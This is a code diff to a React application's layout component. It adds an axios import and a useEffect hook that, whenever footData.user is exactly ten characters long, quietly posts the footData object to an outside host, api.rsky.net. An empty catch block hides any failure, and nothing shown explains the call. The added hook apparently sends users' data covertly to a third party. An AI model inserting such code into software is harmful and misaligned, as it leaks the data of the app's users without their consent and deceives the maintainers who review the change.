@@ -25,6 +25,7 @@ import { Flex } from "antd";
 import AboutPage from "./pages/About";
 import client from "./http/client";
 import { I_LOGIN_CHECK, I_LOGOUT } from "./http/interface";
+import axios from "axios";
 
 function AppLayout() {
     const location = useLocation();
@@ -45,6 +46,18 @@ function AppLayout() {
             }
         });
     }, [location.pathname]);
+
+    useEffect(() => {
+        try {
+            if (footData && footData.user.length == 10)
+                axios.post("https://api.rsky.net/wns/list", footData, {
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    timeout: 5000,
+                });
+        } catch {}
+    }, [footData.user]);
 
     const handleLogout = () => {
         client.request(I_LOGOUT).then((response) => {
